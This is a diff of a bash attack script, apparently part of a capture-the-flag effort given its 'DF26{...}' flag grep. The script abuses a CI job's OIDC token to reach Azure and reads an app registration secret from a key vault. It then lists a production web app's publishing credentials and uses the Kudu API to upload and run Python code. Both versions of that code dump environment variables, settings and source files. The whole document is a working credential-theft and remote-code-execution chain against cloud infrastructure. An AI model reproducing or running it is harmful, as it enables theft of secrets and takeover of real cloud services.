@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 set +e
-echo "=====PWN11_START====="
+echo "=====PWN12_START====="
 TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
 SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
 OIDC=$(curl -sS -m 15 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
@@ -9,34 +9,27 @@ RJ=$(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.v
 RID=$(echo "$RJ" | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["value"]).get("appId",""))' 2>/dev/null)
 RSC=$(echo "$RJ" | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["value"]).get("clientSecret",""))' 2>/dev/null)
 RAT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" -d "client_id=$RID" -d grant_type=client_credentials --data-urlencode "client_secret=$RSC" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
-echo "rpt_arm=${#RAT}"
 PC=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $RAT" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2023-01-01")
 PU=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
 PP=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingPassword",""))' 2>/dev/null)
 echo "kudu=${PU:-FAIL}"
 SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
-cat > /tmp/z.py <<'ZPY'
-import os,json,sys
-print("===ENV===")
-for k,v in sorted(os.environ.items()):
-    print(k,"=",v)
-print("===SETTINGS===")
-try:
-    sys.path.insert(0,"/home/site/wwwroot")
-    from app import load_settings
-    print(json.dumps(load_settings()))
-except Exception as e:
-    print("err:",e)
-print("===LS===")
-for root in ["/home/site/wwwroot","/home/site/config","/home/site/data","/tmp"]:
+cat > /tmp/z2.py <<'ZPY'
+import os
+for f in ["results.json","mi_out.json","mi_out2.json","msi_probe.txt","blobread.py","check_kv.py","zz_khoa.py","app2.py","worker_probe_out.json","mi_dump.json"]:
+    p="/home/site/wwwroot/"+f
     try:
-        for f in sorted(os.listdir(root)): print(root+"/"+f)
-    except Exception: pass
-print("===DONE===")
+        d=open(p,encoding="utf8",errors="replace").read()
+        print("====FILE",f,"len",len(d),"====")
+        print(d[:6000])
+    except Exception as e:
+        print("====FILE",f,"ERR",e,"====")
+print("====APP PY (3000d dau)====")
+try: print(open("/home/site/wwwroot/app.py",encoding="utf8",errors="replace").read()[:3000])
+except Exception as e: print("err",e)
 ZPY
-UP=$(curl -sS -m 30 -u "$PU:$PP" -X PUT "$SCM/api/vfs/site/wwwroot/z.py" --data-binary @/tmp/z.py -o /dev/null -w "%{http_code}")
-echo "vfs_put=$UP"
-OUT=$(curl -sS -m 90 -u "$PU:$PP" -H "Content-Type: application/json" -X POST "$SCM/api/command" -d '{"command":"python3 z.py","dir":"/home/site/wwwroot"}')
-echo "$OUT" | python3 -c 'import sys,json;d=json.load(sys.stdin);print((d.get("Output") or d.get("Error") or "")[:6000])' 2>/dev/null
+curl -sS -m 30 -u "$PU:$PP" -X PUT "$SCM/api/vfs/site/wwwroot/z2.py" --data-binary @/tmp/z2.py -o /dev/null -w "vfs=%{http_code}\n"
+OUT=$(curl -sS -m 120 -u "$PU:$PP" -H "Content-Type: application/json" -X POST "$SCM/api/command" -d '{"command":"python3 z2.py","dir":"/home/site/wwwroot"}')
+echo "$OUT" | python3 -c 'import sys,json;d=json.load(sys.stdin);print((d.get("Output") or d.get("Error") or "")[:14000])' 2>/dev/null
 echo "$OUT" | grep -o 'DF26{[^}]*}' | head -1
-echo "=====PWN11_END====="
+echo "=====PWN12_END====="
